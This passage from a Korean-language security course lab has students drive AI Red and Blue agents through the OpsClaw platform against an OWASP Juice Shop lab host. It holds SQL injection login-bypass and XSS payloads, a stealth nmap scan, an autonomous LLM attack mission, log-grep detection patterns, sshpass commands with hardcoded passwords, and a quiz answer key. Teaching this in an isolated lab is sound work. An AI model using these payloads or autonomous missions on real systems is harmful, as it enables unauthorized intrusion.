        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "echo \"=== 4단계: SQL Injection 테스트 ===\"; curl -s \"http://10.20.30.80:3000/rest/products/search?q=test\" 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f\\\"정상 응답: {len(d.get(\\x27data\\x27,[]))}건\\\")\" 2>/dev/null; echo \"---\"; curl -s \"http://10.20.30.80:3000/rest/products/search?q=test%27--\" 2>/dev/null | head -5",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 5,
        "instruction_prompt": "echo \"=== 5단계: 결과 종합 보고 ===\"; echo \"[대상] 10.20.30.80 (JuiceShop)\"; echo \"[발견 서비스] HTTP(80), Node.js(3000), SSH(22)\"; echo \"[테스트 벡터] SQLi, 디렉토리 열거, 인증 시도\"; echo \"[권장 후속] UNION SQLi 심화, XSS 테스트, API 인증 우회\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - order 1-5는 킬체인의 정찰→핑거프린팅→열거→익스플로잇→보고 단계에 대응한다
> - 각 task에 `echo "=== N단계 ==="`를 포함하여 evidence에서 결과를 구분하기 쉽게 한다
> - order 4의 risk_level이 "medium"인 이유: SQL Injection은 데이터 변조 위험이 있기 때문이다
>
> **트러블슈팅**: 파이프라인 실행 중 특정 task가 실패하면 `GET /projects/{id}/evidence/summary`로 개별 task 결과를 확인한다. nmap 타임아웃은 `--top-ports 100` 대신 `--top-ports 20`으로 줄여서 해결한다.

```bash
# 실행 결과 확인 및 PoW 증적 검증
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  http://localhost:8000/projects/$PROJECT_ID2/evidence/summary \
  | python3 -m json.tool

# PoW 블록 검증 — 모든 공격 행위가 블록체인에 기록되었는지 확인
curl -s "http://localhost:8000/pow/verify?agent_id=http://10.20.30.201:8002" \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
# 정상 응답: {"valid": true, "blocks": N, "orphans": 0, "tampered": []}
```

> **명령어 해설**: PoW 블록 검증은 AI 에이전트의 모든 행위가 불변 증적으로 기록되었음을 확인하는 과정이다. `tampered: []`이면 증적이 변조되지 않았다는 의미이다. `orphans`는 분기 블록 수로, 0이면 정상이다.
>
> **트러블슈팅**: `orphans` 값이 0이 아니면 동일 agent_id로 여러 환경에서 동시 실행된 것일 수 있다. `docs/manual/agent/07-pow-multi-env.md`를 참조하여 원인을 파악한다.

---

# Part 4: AI 공격 에이전트 실전 시뮬레이션 (40분)

## 실습 4.1: 자율 미션 모드 — SubAgent /a2a/mission 활용

> **실습 목적**: SubAgent의 자율 미션(/a2a/mission) 기능을 사용하여 LLM이 자율적으로 공격 계획을 수립하고 실행하는 과정을 체험한다.
>
> **배우는 것**: 완전 자율 AI 에이전트의 작동 방식, 미션 지시(mission prompt)의 구조와 작성법, 자율 에이전트의 행동 경계 설정 방법을 이해한다.
>
> **결과 해석**: 미션 결과에 정찰 결과, 선택한 공격 벡터, 실행 결과가 구조적으로 포함되어 있으면 자율 에이전트가 올바르게 작동한 것이다. LLM이 목표와 무관한 행동을 했다면 미션 프롬프트 수정이 필요하다.
>
> **실전 활용**: 자율 미션 모드는 대규모 네트워크에서 AI가 사람의 개입 없이 취약점을 찾는 "버그 바운티 봇"의 기초 구조이다.

```bash
# OpsClaw를 통한 자율 미션 실행 (Manager API 경유 — 직접 호출 금지)
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID2/dispatch \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "command": "curl -s -X POST http://localhost:8002/a2a/mission -H \"Content-Type: application/json\" -d \"{\\\"mission\\\": \\\"대상 서버 10.20.30.80의 웹 애플리케이션(포트 3000)에 대한 보안 취약점 진단을 수행하라. 순서: 1) 서비스 식별, 2) 입력 검증 취약점 탐색, 3) 인증 메커니즘 분석, 4) 발견 사항 요약. 파괴적 행동은 절대 하지 마라.\\\", \\\"max_steps\\\": 5}\" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -60",
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `/a2a/mission`: SubAgent의 자율 미션 API. LLM이 미션을 해석하고 자체적으로 명령을 생성하여 실행한다
> - `max_steps: 5`: 최대 5회의 ReAct 루프로 제한하여 비용과 시간을 통제한다
> - "파괴적 행동은 절대 하지 마라": 프롬프트에 안전 제약을 명시적으로 포함한다
>
> **트러블슈팅**: 미션이 비정상 종료되면 `max_steps`를 7-10으로 늘려본다. LLM이 무관한 명령을 실행하면 미션 프롬프트를 더 구체적으로 수정한다(예: "오직 curl과 nmap만 사용하라").

## 실습 4.2: Red Agent vs Blue Agent — 기본 대결 구도

> **실습 목적**: Red(공격) 에이전트와 Blue(방어) 에이전트를 각각 실행하여 AI vs AI 대결의 기본 구도를 체험한다.
>
> **배우는 것**: 공격/방어 에이전트의 역할 분리, 서로 다른 관점에서의 보안 분석, 에이전트 대결의 평가 기준을 이해한다.
>
> **결과 해석**: Red Agent의 공격 시도가 Blue Agent의 탐지 규칙에 걸렸다면 방어가 우위이다. 탐지되지 않은 공격이 있다면 탐지 사각지대이다.
>
> **실전 활용**: 이 구도는 퍼플팀 운영의 자동화 버전이며, Week 10에서 강화학습을 적용하여 고도화한다.

```bash
# 새 프로젝트 — AI vs AI 기본 대결
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week09-red-vs-blue",
    "request_text": "AI Red Agent vs Blue Agent 기본 공방전",
    "master_mode": "external"
  }' | python3 -m json.tool
# PROJECT_ID3으로 메모
```

```bash
export PROJECT_ID3="반환된-프로젝트-ID"

# Stage 전환
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID3/plan \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID3/execute \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

```bash
# Phase 1: Red Agent 공격 수행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID3/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[RED] Phase 1: 은밀 정찰\"; nmap -sS -T2 --top-ports 20 10.20.30.80 2>/dev/null | grep open",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[RED] Phase 2: 웹 취약점 탐색\"; curl -s -o /dev/null -w \"SQLi: %{http_code}\" \"http://10.20.30.80:3000/rest/products/search?q=%27OR%201=1--\" 2>/dev/null; echo; curl -s -o /dev/null -w \"XSS: %{http_code}\" \"http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E\" 2>/dev/null",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"[RED] Phase 3: 인증 우회 시도\"; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" 2>/dev/null | head -10",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

```bash
# Phase 2: Blue Agent 탐지 분석
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID3/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[BLUE] Phase 1: IPS 로그 분석\"; sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \"tail -20 /var/log/suricata/fast.log 2>/dev/null || echo No Suricata alerts\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[BLUE] Phase 2: 웹 접근 로그 분석\"; sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \"tail -30 /var/log/apache2/access.log 2>/dev/null | grep -iE \\\"union|select|script|alert|or 1=1\\\" || echo No suspicious entries\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"[BLUE] Phase 3: Wazuh 알림 확인\"; sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \"tail -20 /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -m json.tool 2>/dev/null | head -40 || echo No recent alerts\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - Red Agent: `-sS`(SYN 스캔), `-T2`(느린 타이밍)로 탐지를 최소화하는 은밀 정찰 수행
> - Blue Agent: Suricata IPS 로그, Apache 접근 로그, Wazuh 알림 세 곳을 교차 분석
> - `grep -iE 'union|select|script|alert'`: SQL Injection과 XSS 공격 시그니처 패턴 검색
>
> **트러블슈팅**: SSH 접속 실패 시 `sshpass` 패키지 설치 여부 확인. Wazuh 로그 경로가 다를 수 있으므로 `find /var/ossec/logs -name "alerts*"` 명령으로 실제 경로를 확인한다.

## 실습 4.3: 공격 에이전트 성능 평가 및 비교

> **실습 목적**: AI 공격 에이전트의 성능을 정량적으로 평가하는 메트릭을 수집하고 분석한다.
>
> **배우는 것**: 에이전트 평가 기준(발견율, 정밀도, 비용 효율성), PoW 보상 데이터를 활용한 성능 측정, evidence summary의 분석 방법을 이해한다.
>
> **결과 해석**: 발견된 취약점 수, 실행 시간, 토큰 사용량의 비율로 에이전트 효율성을 판단한다. 비용 대비 발견율이 높을수록 효율적이다.
>
> **실전 활용**: 이 평가 프레임워크는 Week 10의 강화학습 기반 에이전트 최적화에서 보상 함수의 기초가 된다.

```bash
# 전체 프로젝트의 실행 결과 조회
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  http://localhost:8000/projects/$PROJECT_ID2/evidence/summary \
  | python3 -m json.tool

# 프로젝트 Replay — 전체 실행 과정을 시간순으로 재현
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  http://localhost:8000/projects/$PROJECT_ID2/replay \
  | python3 -m json.tool | head -60
```

```bash
# PoW 보상 기반 에이전트 성능 랭킹
curl -s http://localhost:8000/pow/leaderboard \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool

# RL 추천 조회 — 현재 에이전트의 최적 행동 추천
curl -s "http://localhost:8000/rl/recommend?agent_id=http://10.20.30.201:8002&risk_level=medium" \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

> **명령어 해설**:
> - `evidence/summary`: 프로젝트에서 실행된 모든 태스크의 결과를 종합한 요약 API
> - `replay`: 프로젝트의 전체 실행 과정을 시간순으로 재현하여 분석 가능하게 하는 API
> - `pow/leaderboard`: 에이전트별 누적 보상 랭킹 조회
> - `rl/recommend`: Q-learning 정책 기반 최적 행동 추천 조회
>
> **트러블슈팅**: leaderboard가 비어있으면 `curl -X POST http://localhost:8000/rl/train`으로 RL 학습을 먼저 실행한다. 학습 데이터가 부족하면 더 많은 태스크를 실행한 후 재시도한다.

### 에이전트 성능 평가 메트릭 종합표

| 메트릭 | 계산 방법 | 목표 값 | 개선 방법 |
|--------|----------|---------|----------|
| **발견율 (Discovery Rate)** | 발견 취약점 수 / 알려진 취약점 수 | > 70% | 정찰 범위 확대, 다양한 공격 벡터 |
| **정밀도 (Precision)** | 실제 취약점 / 보고 취약점 | > 80% | 검증 단계 추가, LLM 분석 정교화 |
| **효율성 (Efficiency)** | 발견 취약점 수 / 실행 태스크 수 | > 0.3 | 불필요한 태스크 제거, 우선순위 |
| **비용 효율성 (Cost Efficiency)** | 발견 취약점 수 / 토큰 사용량 | 높을수록 좋음 | 프롬프트 최적화, 소형 모델 활용 |
| **은밀성 (Stealth)** | 1 - (탐지 횟수 / 공격 시도 횟수) | > 0.5 | 타이밍 조절, 페이로드 변형 |
| **소요 시간** | 전체 파이프라인 실행 시간 | 환경에 따라 다름 | 병렬 실행, 타임아웃 최적화 |

## 4.4 AI 공격의 윤리적 고려사항과 법적 프레임워크

AI 공격 에이전트의 강력함은 곧 위험을 의미한다. 반드시 윤리적 경계를 명확히 해야 한다.

### 통제 메커니즘 6계층

| 계층 | 메커니즘 | OpsClaw 구현 | 실패 시 영향 |
|------|---------|-------------|------------|
| **1. 프롬프트 수준** | 시스템 프롬프트에 제한 명시 | "파괴적 명령 금지, 범위 외 대상 금지" | LLM이 제한 무시 가능 |
| **2. 도구 수준** | 위험 명령 필터링 | tool_validator, permission_engine | 필터 우회 시 위험 |
| **3. 플랫폼 수준** | risk_level 기반 자동 통제 | critical → dry_run, 사용자 확인 필수 | 사용자가 맹목적 승인 |
| **4. 인프라 수준** | 네트워크 격리, 방화벽 | 실습 환경 내부 네트워크만 접근 | 설정 오류 시 외부 유출 |
| **5. 증적 수준** | 모든 행위 불변 기록 | PoW 블록체인, evidence 시스템 | 사후 추적 가능 |
| **6. 법적 수준** | 계약서, 범위 합의 | 실습 환경에 한정 | 법적 책임 |

### 관련 법률 및 규정

| 법률 | 적용 지역 | 핵심 조항 | 위반 시 제재 |
|------|----------|----------|------------|
| 정보통신망법 | 대한민국 | 정당한 접근 권한 없이 정보통신망 침입 금지 | 5년 이하 징역/5천만원 이하 벌금 |
| CFAA | 미국 | Computer Fraud and Abuse Act | 최대 20년 징역 |
| Computer Misuse Act | 영국 | 무단 접근, 무단 변경 금지 | 최대 10년 징역 |
| NIS2 Directive | EU | 네트워크 보안 사고 보고 의무 | 매출의 2% 과징금 |
| 개인정보보호법 | 대한민국 | 개인정보 무단 수집/이용 금지 | 5년 이하/5천만원 이하 |

---

## 검증 체크리스트

실습 완료 후 다음 항목을 스스로 확인한다:

- [ ] AI 에이전트의 핵심 구성 요소(LLM, 도구, 메모리, 피드백 루프)를 설명할 수 있는가?
- [ ] ReAct 패턴의 추론→행동→관찰 루프를 직접 구현할 수 있는가?
- [ ] OpsClaw의 execute-plan을 사용하여 멀티 스텝 공격 파이프라인을 실행할 수 있는가?
- [ ] SubAgent의 /a2a/mission, /a2a/analyze API의 용도와 차이를 설명할 수 있는가?
- [ ] bastion의 prompt_engine을 활용하여 공격 에이전트 프롬프트를 구성할 수 있는가?
- [ ] Red Agent와 Blue Agent의 역할 차이를 명확히 설명할 수 있는가?
- [ ] AI 공격 에이전트의 성능 평가 메트릭(발견율, 정밀도, 효율성)을 계산할 수 있는가?
- [ ] PoW 블록 검증을 통해 에이전트 행위의 무결성을 확인할 수 있는가?
- [ ] AI 공격 에이전트의 6계층 통제 메커니즘을 나열하고 각각의 역할을 설명할 수 있는가?
- [ ] risk_level에 따른 OpsClaw의 실행 제어 동작(low/medium/high/critical)을 설명할 수 있는가?

---

## 자가 점검 퀴즈 (10문항)

**Q1.** AI 에이전트의 ReAct 패턴에서 "Act"에 해당하는 것은?
- (a) LLM의 추론 결과 생성  (b) **외부 도구를 호출하여 환경에 작용**  (c) 이전 결과를 분석  (d) 시스템 프롬프트 로딩

**Q2.** OpsClaw에서 SubAgent에 직접 POST를 보내면 안 되는 이유는?
- (a) 속도가 느려서  (b) **증적 관리와 안전 통제가 우회되므로**  (c) SubAgent가 거부해서  (d) API 키가 다르므로

**Q3.** AI 공격 에이전트의 의사결정 Scoring Model에서 가장 높은 가중치를 가진 기준은?
- (a) 비용  (b) 피드백 품질  (c) **성공 확률**  (d) 은밀성

**Q4.** bastion의 prompt_engine이 하는 핵심 역할은?
- (a) LLM 모델 학습  (b) **시스템 프롬프트를 동적으로 조합**  (c) 데이터베이스 관리  (d) 네트워크 스캔

**Q5.** risk_level이 "critical"인 태스크를 실행하면 OpsClaw는 어떻게 동작하는가?
- (a) 즉시 실행  (b) 에러 반환  (c) **dry_run을 자동 강제하고 사용자 확인을 요구**  (d) 태스크를 삭제

**Q6.** PoW 블록 검증에서 `tampered: []`가 의미하는 것은?
- (a) 블록이 없음  (b) **증적이 변조되지 않았음**  (c) 모든 블록이 실패  (d) 체인이 분기됨

**Q7.** 멀티 에이전트 공격 시스템에서 오케스트레이터의 핵심 역할은?
- (a) 직접 명령 실행  (b) LLM 모델 제공  (c) **에이전트 간 실행 순서와 상호작용 관리**  (d) 로그 저장

**Q8.** SubAgent의 /a2a/mission에서 max_steps 파라미터의 용도는?
- (a) 최대 명령 길이 제한  (b) **최대 ReAct 루프 반복 횟수 제한**  (c) 최대 응답 토큰 수  (d) 최대 동시 실행 수

**Q9.** AI 공격 에이전트의 6계층 통제 중 "인프라 수준"에 해당하는 것은?
- (a) 시스템 프롬프트 제한  (b) risk_level 제어  (c) PoW 기록  (d) **네트워크 격리와 방화벽**

**Q10.** 전통적 침투 테스트 대비 AI 에이전트의 가장 큰 장점은?
- (a) 더 높은 창의성  (b) **재현성과 증적 관리의 자동화**  (c) 법적 면책  (d) 제로데이 발견 능력

**정답:** Q1:b, Q2:b, Q3:c, Q4:b, Q5:c, Q6:b, Q7:c, Q8:b, Q9:d, Q10:b

---

## 과제

### 과제 1: ReAct 공격 에이전트 확장 (필수)
실습에서 구축한 ReAct 공격 에이전트를 확장하라:
- 정찰 결과를 기반으로 **최소 3가지 다른 공격 벡터**를 자동 시도하는 execute-plan 작성
- 각 공격 벡터의 ATT&CK ID를 매핑하여 주석으로 포함 (예: T1190, T1059 등)
- 모든 실행 결과를 evidence/summary로 수집하고 분석 보고서 작성
- PoW 블록이 정상 생성되었는지 verify API로 검증

### 과제 2: 공격 에이전트 프롬프트 최적화 (필수)
다음 세 가지 시스템 프롬프트 수준을 작성하고 성능을 비교하라:
- (A) 최소한의 역할 정의만 포함 ("당신은 침투 테스터이다.")
- (B) 상세한 역할 + 도구 목록 + 행동 규칙 포함
- (C) (B) + 구체적 공격 절차와 우선순위 포함
- 각 프롬프트로 동일 대상(/a2a/mission)을 공격하고 결과를 비교하라 (발견율, 정밀도, 소요 시간)

### 과제 3: 방어 관점 분석 (선택)
실습에서 수행한 AI 공격을 방어자 관점에서 분석하라:
- 각 공격 단계에서 어떤 로그/알림이 생성되었는가?
- 탐지하지 못한 공격이 있다면 왜 탐지되지 않았는가?
- 추가 탐지 규칙을 3개 이상 제안하라 (Suricata 규칙 또는 Wazuh 디코더 형식)

---

## 다음 주 예고

**Week 10: AI vs AI 공방전 (2) — 강화학습 전략, 에이전트 튜닝, 앙상블**
- 강화학습(RL)을 적용하여 공격/방어 에이전트의 행동 정책을 자동 학습
- Q-learning 기반 최적 risk_level 추천 시스템 활용
- 프롬프트 최적화와 에이전트 앙상블 전략 설계
- OpsClaw RL API를 활용한 에이전트 행동 개선 실습
